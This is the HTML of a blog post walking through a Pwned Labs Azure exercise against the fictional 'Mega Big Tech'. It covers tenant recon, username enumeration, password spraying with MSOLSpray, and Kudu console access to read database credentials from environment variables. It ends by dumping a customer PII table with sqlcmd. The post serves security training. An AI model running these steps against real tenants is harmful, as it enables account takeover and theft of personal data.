@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Azure Recon to Foothold and Profit | SecFortress</title>
+<meta name="keywords" content="Azure, Red Teaming, Entra-ID, Powershell">
+<meta name="description" content="Discover how various reconnaisance techniques could be used to enumerate Azure subscriptions and Tenant to identify mistakes or weak points when setting up an environment">
+<meta name="author" content="SecFortress">
+<link rel="canonical" href="http://localhost:1313/hacking/azure_recon_to_foothold_and_profit/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/azure_recon_to_foothold_and_profit/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://localhost:1313/hacking/azure_recon_to_foothold_and_profit/">
+  <meta property="og:site_name" content="SecFortress">
+  <meta property="og:title" content="Azure Recon to Foothold and Profit">
+  <meta property="og:description" content="Discover how various reconnaisance techniques could be used to enumerate Azure subscriptions and Tenant to identify mistakes or weak points when setting up an environment">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="hacking">
+    <meta property="article:published_time" content="2024-10-28T14:13:44+01:00">
+    <meta property="article:modified_time" content="2024-10-28T14:13:44+01:00">
+    <meta property="article:tag" content="Azure">
+    <meta property="article:tag" content="Red Teaming">
+    <meta property="article:tag" content="Entra-ID">
+    <meta property="article:tag" content="Powershell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Azure Recon to Foothold and Profit">
+<meta name="twitter:description" content="Discover how various reconnaisance techniques could be used to enumerate Azure subscriptions and Tenant to identify mistakes or weak points when setting up an environment">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hackings",
+      "item": "http://localhost:1313/hacking/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Azure Recon to Foothold and Profit",
+      "item": "http://localhost:1313/hacking/azure_recon_to_foothold_and_profit/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Azure Recon to Foothold and Profit",
+  "name": "Azure Recon to Foothold and Profit",
+  "description": "Discover how various reconnaisance techniques could be used to enumerate Azure subscriptions and Tenant to identify mistakes or weak points when setting up an environment",
+  "keywords": [
+    "Azure", "Red Teaming", "Entra-ID", "Powershell"
+  ],
+  "articleBody": "Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nWalkThrough A possible password leak was found on pastebin\nWe need to determine if Mega Big Tech is using Azure Entra ID to manage their identities. The domain name megabigtech.com was given and it is possible check if a particular company is using Entra ID for authentication by browsing to the URL below. https://login.microsoftonline.com/getuserrealm.srf?login=megabigtech.com\u0026xml=1\nWhereas replacing the ?login parameter with the domain name Then if the NameSpaceType value shows as Managed then the company is using Entra ID ; The GetUserRealm.srf path is known as a user realm discovery described by Microsoft An input is given on the Microsoft sign-in page for the username value A request is then sent to this endpoint to determine the type of account associated with that username We can then attempt to get more information about the tenant since we know the company is using Entra ID.\nThe following URL allows us to do this, by using the .well-known/openid-configuration endpoint in the context of OpenID Connect (OIDC), which is an identity layer on top of the OAuth 2.0 protocol.\nhttps://login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration\nThis is a critical endpoint for -:\nClients to discover how to interact with the identity provider’s OAuth 2.0 Clients to discover how to interact with the identity provider’s OpenID Connect services As shown in the below screenshot the Tenant ID is revealed -:\nThere are also alternate ways to enumerate this for example, using tools like AADInternals\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Install-Module AADInternals PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Import-Module AADInternals ___ ___ ____ ____ __ __ / | / | / __ \\/ _/___ / /____ _________ ____ _/ /____ / /| | / /| | / / / // // __ \\/ __/ _ \\/ ___/ __ \\/ __ `/ / ___/ / ___ |/ ___ |/ /_/ _/ // / / / /_/ __/ / / / / / /_/ / (__ ) /_/ |_/_/ |_/_____/___/_/ /_/\\__/\\___/_/ /_/ /_/\\__,_/_/____/ v0.9.4 by @DrAzureAD (Nestori Syynimaa) With the below commands we can get the domain information and the Tenant ID\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AADIntLoginInformation -Domain megabigtech.com Federation Metadata Url : Cloud Instance : microsoftonline.com Account Type : Managed Federation Brand Name : Default Directory Tenant Banner Logo : State : 4 Pref Credential : 1 Cloud Instance audience urn : urn:federation:MicrosoftOnline Tenant Banner Illustration : Authentication Url : Domain Name : megabigtech.com Exists : 1 Federation Active Authentication Url : Domain Type : 3 Federation Protocol : Throttle Status : 0 Has Password : True Consumer Domain : Tenant Locale : Federation Global Version : User State : 1 Desktop Sso Enabled : PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AADIntTenantID -Domain megabigtech.com 2590ccef-687d-493b-ae8d-441cbab63a72 We can also run the next command, which looks to answer the following questions as described by PwnedLabs :\nValue Description DNS Does the DNS record exist? MX Does the MX point to Office 365? SPF Does the SPF contain Exchange Online? Type Federated or Managed DMARC Is the DMARC record configured? DKIM Is the DKIM record configured? MTA-STS Is the MTA-STS recored configured? STS The FQDN of the federated IdP’s (Identity Provider) STS (Security Token Service) server RPS Relaying parties of STS (AD FS). Requires -GetRelayingParties switch. Source: https://aadinternals.com/aadinternals/#invoke-aadintreconasoutsider\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Invoke-AADIntReconAsOutsider -Domain \"megabigtech.com\" | Format-Table Tenant brand: Default Directory Tenant name: iancloudpwned.onmicrosoft.com Tenant id: 2590ccef-687d-493b-ae8d-441cbab63a72 Tenant region: EU DesktopSSO enabled: False Name DNS MX SPF DMARC DKIM MTA-STS Type STS ---- --- -- --- ----- ---- ------- ---- --- iancloudpwned.mail.onmicrosoft.com False False False False False Managed iancloudpwned.onmicrosoft.com False False False False False Managed international-am.com False False False False False Managed megabigtech.com False False False False False Managed We can also gather subdomains using the AzSubEnum tool, a specialized subdomain enumeration tool tailored for Azure services.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e git clone https://github.com/yuyudhn/AzSubEnum.git Cloning into 'AzSubEnum'... remote: Enumerating objects: 45, done. remote: Counting objects: 100% (45/45), done. remote: Compressing objects: 100% (38/38), done. remote: Total 45 (delta 20), reused 19 (delta 6), pack-reused 0 (from 0) Receiving objects: 100% (45/45), 386.80 KiB | 235.00 KiB/s, done. Resolving deltas: 100% (20/20), done. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e cd ./AzSubEnum/ PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/AzSubEnum\u003e python3 azsubenum.py -b megabigtech --thread 10 Discovered Subdomains: App Services - Management: --------------------------------------- megabigtech.scm.azurewebsites.net App Services: ----------------------------------- megabigtech.azurewebsites.net Navigating to the discovered App Services subdomain we have the below web page\nAccording to the above screenshots\nWe have some employees and their roles assigned We also have an email format ; “Kato.Sara@megabigtech.com” which could be used to create other emails also as shown below : yuki.tanaka@megabigtech.com yamamoto.sota@megabigtech.com takahashi.hina@megabigtech.com kato.sara@megabigtech.com Since we now have a username wordlist we can manually test them by going to https://login.microsoftonline.com. If a username is valid we would be prompted for a password else, a message “This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.” would be returned\nIt is possible to automate this whole process though by using a tool called Omnispray\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e git clone https://github.com/0xZDH/Omnispray Cloning into 'Omnispray'... remote: Enumerating objects: 460, done. remote: Counting objects: 100% (45/45), done. remote: Compressing objects: 100% (31/31), done. remote: Total 460 (delta 27), reused 19 (delta 14), pack-reused 415 (from 1) Receiving objects: 100% (460/460), 87.13 KiB | 97.00 KiB/s, done. Resolving deltas: 100% (302/302), done. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e cd ./Omnispray/ PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/Omnispray\u003e nano users.txt PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/Omnispray\u003e python3 omnispray.py --type enum -uf users.txt --module o365_enum_office *** Omnispray *** \u003e---------------------------------------\u003c \u003e version : 0.1.4 \u003e module : o365_enum_office \u003e type : enum \u003e userfile : users.txt \u003e count : 1 passwords/spray \u003e lockout : 15.0 minutes \u003e wait : 5.0 \u003e timeout : 25 seconds \u003e pause : 0.25 seconds \u003e rate : 10 threads \u003e start : 2024-10-26 15:15:52 \u003e---------------------------------------\u003c [2024-10-26 15:15:52,906] INFO : Generating prerequisite data via office.com... [2024-10-26 15:16:17,914] INFO : Enumerating 4 users via 'o365_enum_office' module [2024-10-26 15:16:30,667] INFO : [ + ] yuki.tanaka@megabigtech.com [ - ] yamamoto.sota@megabigtech.com [2024-10-26 15:16:32,797] INFO : Results can be found in: '/home/sec-fortress/Az_lab/Omnispray/results/' [2024-10-26 15:16:32,797] INFO : Valid user accounts: 1 [2024-10-26 15:16:33,049] INFO : /home/sec-fortress/Az_lab/Omnispray/omnispray.py executed in 40.26 seconds. Since we now have a valid set of account we can go ahead and perform a credential stuffing or password spraying attack as this are definitely noisy and risk detection (and locking accounts), and so it’s often worth exploring other avenues.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e wget https://raw.githubusercontent.com/dafthack/MSOLSpray/refs/heads/master/MSOLSpray.ps1 Saving to: ‘MSOLSpray.ps1’MSOLSpray.ps1 100%[=====================================================================================================\u003e] 8.52K 32.0KB/s in 0.3s 2024-10-26 15:25:51 (32.0 KB/s) - ‘MSOLSpray.ps1’ saved [8727/8727] ## Import module with dot sourcing PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e . .\\MSOLSpray.ps1 PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e echo \"yuki.tanaka@megabigtech.com\" \u003e valid_user PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Invoke-MSOLSpray -UserList ./valid_user -Password \"MegaDev79$\" -Verbose [*] There are 1 total users to spray. [*] Now spraying Microsoft Online. [*] Current date and time: 10/26/2024 15:27:00 VERBOSE: POST with 195-byte payload VERBOSE: received 3677-byte response of content type application/json [*] SUCCESS! yuki.tanaka@megabigtech.com : MegaDev79$ “Note: very often we wouldn’t be able to just log directly into a tenant over the Internet as MFA is getting more common place. Other guided labs from Pwned Labs where explored on how to check if MFA is enabled for gaps and to gain access.” – PwnedLabs\nWe can then attempt to gather as much information as possible with our credentialed access using the Az Powershell and Microsoft Graph PowerShell SDK modules\nConnect-AzAccount Connect-MgGraph To Enumerate all users in the tenant we can issue the following command.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzADUser Here are some few questions to ask after getting foothold with a compromised user as described by PwnedLabs:\nIs the user part of any group? If so, does this group has any role assigned to it? Does the user have any Azure Entra ID roles assigned to them? Which objects has this user created? Is this user the owner of any service principal? We can go ahead and query individual properties a using the Az PowerShell module which could help in mapping out possible responsibilities and relationships within the company.\nGet-AzADUser -UserPrincipalName 'yuki.tanaka@megabigtech.com' | fl Using the below command we could also check if there are resources owned by our current user (None Unfortunately) .\nGet-MgUserOwnedObject -UserId \"yuki.tanaka@megabigtech.com\" We could also check if our present user is a member of any groups by looping through all groups with the below script.\n$userId = \"yuki.tanaka@megabigtech.com\" $groupIds = (Get-MgUserMemberOf -UserId $userId).Id $groupNames = @() foreach ($groupId in $groupIds) { $group = Get-MgGroup -GroupId $groupId $groupNames += $group.DisplayName } $groupNames No interesting data or role where discovered in this tenant, We can switch to the Azure Subscription and enumerate which RBAC roles this user has.\nRetrieve the current authentication context for Azure Resource Manager requests PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzContext Tenant: Default Directory (2590ccef-687d-493b-ae8d-441cbab63a72) SubscriptionName SubscriptionId Account Environment ---------------- -------------- ------- ----------- Microsoft Azure Sponsorship ceff06cb-e29d-4486-a3ae-eaaec5689f94 yuki.tanaka@megabigtech.com AzureCloud The Get-AzContext -ListAvailable cmdlet returns all available, previously logged in contexts\nIf a user hasn’t executed the Disconnect-AzAccount command The session’s context remains active! In which the Select-AzContext command could be used to impersonate the session. See Blog1, Blog2 and Blog3 to understand more. Enumerate subscriptions that are accessible/available to the current user PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzSubscription TenantId: 2590ccef-687d-493b-ae8d-441cbab63a72 Name Id State ---- -- ----- Microsoft Azure Sponsorship ceff06cb-e29d-4486-a3ae-eaaec5689f94 Enabled Food For Thoughts :\nSo, many subscriptions can share one tenant, but each subscription is “loyal” to just one tenant.\nThe below command will return the resources for which the user has at least the Reader role in Role-Based Access Control (RBAC)\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzResource Name : megabigtechdevapp23 ResourceGroupName : mbt-rg-3 ResourceType : Microsoft.Web/sites Location : eastus ResourceId : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-3/providers/Microsoft.Web/sites/megabigtechdevapp23 Tags : We can check what RBAC permissions we have over this Web App by running the following cmdlet\nGet-AzRoleAssignment -SignInName \u003cUser-Email\u003e Break Down :\nUser has the Website Contributor role on an Azure App Service. This role includes access to the Kudu console, a tool for debugging and monitoring Azure Web Apps. The Kudu console provides terminal access to the app’s underlying operating system in a low-privilege Linux sandbox. If the web app connects to other Azure resources (e.g., Azure SQL, Storage Account, Key Vault), the user may access these in the context of the app’s permissions. We can go ahead an enumerate the web app further using the following cmdlet\nGet-AzWebApp -Name megabigtechdevapp23 | select enabledhostnames We are more concerned about the megabigtachdevapp23.scm.azurewebsites.net output. Notice the scm between the app’s name and the default azure domain azurewebsites.net .\nSCM stands for Source Control Manager, otherwise known as Kudu.\nNavigating to this domain gives us this web page as shown below :\nNext, click on Debug console \u003e PowerShell .\nExploit Option 1 :\nWeb Apps often connect to backend resources using managed identities (a best practice). To verify this, check for environment variables like IDENTITY_ENDPOINT and IDENTITY_HEADER, which are required by managed identities. If these variables are present, you can request a token on behalf of the app to access its connected resources. For further details checkout this blog Exploit Option 2 :\nWeb Apps can also connect to resources using connection strings stored in environment variables (via App settings). You can list all environment variables with the env command. To find relevant variables, use grep to filter by keywords (e.g., connection string names or resource names). env | grep -i -e \"DB\" As shown in the above screenshot we got a connection string for an azure SQL instance at the well-known domain database.windows.net which provides us with the necessary credentials to connect to the database!\nIt is possible to enumerate useful software on this PowerShell session using the below cmdlet such as:\nMicrosoft SQL Server Command Line Utilities SQLCMD Microsoft SQL Server (along with any mention of “Tools” or “Utilities”) ODBC Driver for SQL Server (sometimes sqlcmd is installed alongside ODBC drivers) Get-ItemProperty -Path \"HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\", \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\", \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" |where { $_.DisplayName -ne $null } | Select-Object DisplayName, DisplayVersion, InstallDate We can therefore query the database and check for available tables.\nsqlcmd -S megabigdevsqlserver.database.windows.net -U \u003cUsername\u003e -P \u003c'Password'\u003e -d \u003cDB-NAME\u003e -Q \"SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'\" The CustomerData table was returned in output. Retrieving data from this table reveals PII (personally identifiable information) of Mega Big Tech customers :(\nsqlcmd -S megabigdevsqlserver.database.windows.net -U \u003cUsername\u003e -P \u003c'Password'\u003e -d \u003cDB-NAME\u003e -Q \"SELECT * FROM CustomerData\" That’s all for today. For further reading, I recommend checking out PwnedLabs, which includes defensive strategies to mitigate these issues ⛇☃︎.\n",
+  "wordCount" : "2064",
+  "inLanguage": "en",
+  "datePublished": "2024-10-28T14:13:44+01:00",
+  "dateModified": "2024-10-28T14:13:44+01:00",
+  "author":{
+    "@type": "Person",
+    "name": "SecFortress"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/hacking/azure_recon_to_foothold_and_profit/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "SecFortress",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="SecFortress (Alt + H)">
+                <img src="http://localhost:1313/images/avatar.jpeg" alt="" aria-label="logo"
+                    height="25">SecFortress</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/hacking" title="🥷 Hacking">
+                    <span>🥷 Hacking</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://sec-fortress.github.io/" title="✍️ Notes">
+                    <span>✍️ Notes</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/whoami" title="🇳🇬 Whoami">
+                    <span>🇳🇬 Whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/hacking/">Hackings</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Azure Recon to Foothold and Profit
+    </h1>
+    <div class="post-description">
+      Discover how various reconnaisance techniques could be used to enumerate Azure subscriptions and Tenant to identify mistakes or weak points when setting up an environment
+    </div>
+    <div class="post-meta"><span title='2024-10-28 14:13:44 +0100 WAT'>October 28, 2024</span>&nbsp;·&nbsp;<span>10 min</span>&nbsp;·&nbsp;<span>SecFortress</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#walkthrough"><strong>WalkThrough</strong></a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><strong>Note : This article was inspired by content from <a href="https://pwnedlabs.io/labs/azure-recon-to-foothold-and-profit">Pwned Labs</a>. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.</strong></p>
+<p><img loading="lazy" src="/b09c1a5729661d9abce16e7c454acadc.gif#center"></p>
+<h2 id="walkthrough"><strong>WalkThrough</strong><a hidden class="anchor" aria-hidden="true" href="#walkthrough">#</a></h2>
+<p>A possible password leak was found on <a href="https://pastebin.com/ZfqZdpX8">pastebin</a></p>
+<ul>
+<li>We need to determine if Mega Big Tech is using Azure Entra ID to manage their identities.</li>
+<li>The domain name <a href="megabigtech.com">megabigtech.com</a> was given and it is possible check if a particular company is using Entra ID for authentication by browsing to the URL below.</li>
+</ul>
+<p><a href="https://login.microsoftonline.com/getuserrealm.srf?login=megabigtech.com&amp;xml=1">https://login.microsoftonline.com/getuserrealm.srf?login=megabigtech.com&amp;xml=1</a></p>
+<ul>
+<li>Whereas replacing the <code>?login</code> parameter with the domain name</li>
+<li>Then if the <code>NameSpaceType</code> value shows as <code>Managed</code> then the company is using Entra ID ;</li>
+</ul>
+<p><img loading="lazy" src="https://i.imgur.com/LmiBYWa.png"></p>
+<ul>
+<li>The <code>GetUserRealm.srf</code> path is known as a <strong>user realm discovery</strong> described by Microsoft
+<ul>
+<li>An input is given on the Microsoft sign-in page for the username value</li>
+<li>A request is then sent to this endpoint to determine the type of account associated with that username</li>
+</ul>
+</li>
+</ul>
+<p>We can then attempt to get more information about the tenant since we know the company is using Entra ID.</p>
+<p>The following URL allows us to do this, by using the <code>.well-known/openid-configuration</code> endpoint in the context of <code>OpenID</code> Connect (<code>OIDC</code>), which is an identity layer on top of the <code>OAuth</code> 2.0 protocol.</p>
+<p><a href="https://login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration">https://login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration</a></p>
+<p>This is a critical endpoint for -:</p>
+<ol>
+<li>Clients to discover how to interact with the identity provider&rsquo;s <code>OAuth</code> 2.0</li>
+<li>Clients to discover how to interact with the identity provider&rsquo;s <code>OpenID</code> Connect services</li>
+</ol>
+<p>As shown in the below screenshot the Tenant ID is revealed -:</p>
+<p><img loading="lazy" src="https://i.imgur.com/f3aecVs.png"></p>
+<p>There are also alternate ways to enumerate this for example, using tools like <a href="https://aadinternals.com/aadinternals/">AADInternals</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Install-Module</span> <span class="n">AADInternals</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="n">AADInternals</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">___</span>    <span class="n">___</span>    <span class="n">____</span>  <span class="n">____</span>      <span class="n">__</span>                        <span class="n">__</span>    
+</span></span><span class="line"><span class="cl">   <span class="p">/</span>   <span class="p">|</span>  <span class="p">/</span>   <span class="p">|</span>  <span class="p">/</span> <span class="n">__</span> <span class="p">\/</span>  <span class="n">_</span><span class="p">/</span><span class="n">___</span>  <span class="p">/</span> <span class="p">/</span><span class="n">____</span>  <span class="n">_________</span>  <span class="n">____</span> <span class="n">_</span><span class="p">/</span> <span class="p">/</span><span class="n">____</span>
+</span></span><span class="line"><span class="cl">  <span class="p">/</span> <span class="p">/|</span> <span class="p">|</span> <span class="p">/</span> <span class="p">/|</span> <span class="p">|</span> <span class="p">/</span> <span class="p">/</span> <span class="p">/</span> <span class="p">//</span> <span class="p">//</span> <span class="n">__</span> <span class="p">\/</span> <span class="n">__</span><span class="p">/</span> <span class="n">_</span> <span class="p">\/</span> <span class="n">___</span><span class="p">/</span> <span class="n">__</span> <span class="p">\/</span> <span class="n">__</span> <span class="p">`/</span> <span class="p">/</span> <span class="n">___</span><span class="p">/</span>
+</span></span><span class="line"><span class="cl"> <span class="p">/</span> <span class="n">___</span> <span class="p">|/</span> <span class="n">___</span> <span class="p">|/</span> <span class="p">/</span><span class="n">_</span><span class="p">/</span> <span class="n">_</span><span class="p">/</span> <span class="p">//</span> <span class="p">/</span> <span class="p">/</span> <span class="p">/</span> <span class="p">/</span><span class="n">_</span><span class="p">/</span>  <span class="n">__</span><span class="p">/</span> <span class="p">/</span>  <span class="p">/</span> <span class="p">/</span> <span class="p">/</span> <span class="p">/</span> <span class="p">/</span><span class="n">_</span><span class="p">/</span> <span class="p">/</span> <span class="p">(</span><span class="n">__</span>  <span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">_</span><span class="p">/</span>  <span class="p">|</span><span class="n">_</span><span class="p">/</span><span class="n">_</span><span class="p">/</span>  <span class="p">|</span><span class="n">_</span><span class="p">/</span><span class="n">_____</span><span class="p">/</span><span class="n">___</span><span class="p">/</span><span class="n">_</span><span class="p">/</span> <span class="p">/</span><span class="n">_</span><span class="p">/\</span><span class="n">__</span><span class="p">/\</span><span class="n">___</span><span class="p">/</span><span class="n">_</span><span class="p">/</span>  <span class="p">/</span><span class="n">_</span><span class="p">/</span> <span class="p">/</span><span class="n">_</span><span class="p">/\</span><span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="p">/</span><span class="n">_</span><span class="p">/</span><span class="n">____</span><span class="p">/</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"> <span class="n">v0</span><span class="p">.</span><span class="py">9</span><span class="p">.</span><span class="py">4</span> <span class="n">by</span> <span class="nv">@DrAzureAD</span> <span class="p">(</span><span class="n">Nestori</span> <span class="n">Syynimaa</span><span class="p">)</span>
+</span></span></code></pre></div><p>With the below commands we can get the domain information and the Tenant ID</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Get-AADIntLoginInformation</span> <span class="n">-Domain</span> <span class="n">megabigtech</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Federation</span> <span class="n">Metadata</span> <span class="n">Url</span>              <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Cloud</span> <span class="n">Instance</span>                       <span class="err">:</span> <span class="n">microsoftonline</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Account</span> <span class="nb">Type </span>                        <span class="err">:</span> <span class="n">Managed</span>
+</span></span><span class="line"><span class="cl"><span class="n">Federation</span> <span class="n">Brand</span> <span class="n">Name</span>                <span class="err">:</span> <span class="k">Default</span> <span class="n">Directory</span>
+</span></span><span class="line"><span class="cl"><span class="n">Tenant</span> <span class="n">Banner</span> <span class="n">Logo</span>                   <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">State</span>                                <span class="err">:</span> <span class="mf">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">Pref</span> <span class="n">Credential</span>                      <span class="err">:</span> <span class="mf">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cloud</span> <span class="n">Instance</span> <span class="n">audience</span> <span class="n">urn</span>          <span class="err">:</span> <span class="n">urn</span><span class="err">:</span><span class="n">federation</span><span class="err">:</span><span class="n">MicrosoftOnline</span>
+</span></span><span class="line"><span class="cl"><span class="n">Tenant</span> <span class="n">Banner</span> <span class="n">Illustration</span>           <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Authentication</span> <span class="n">Url</span>                   <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Domain</span> <span class="n">Name</span>                          <span class="err">:</span> <span class="n">megabigtech</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Exists</span>                               <span class="err">:</span> <span class="mf">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Federation</span> <span class="n">Active</span> <span class="n">Authentication</span> <span class="n">Url</span> <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Domain</span> <span class="nb">Type </span>                         <span class="err">:</span> <span class="mf">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">Federation</span> <span class="n">Protocol</span>                  <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Throttle</span> <span class="n">Status</span>                      <span class="err">:</span> <span class="mf">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Has</span> <span class="n">Password</span>                         <span class="err">:</span> <span class="n">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">Consumer</span> <span class="n">Domain</span>                      <span class="err">:</span> 
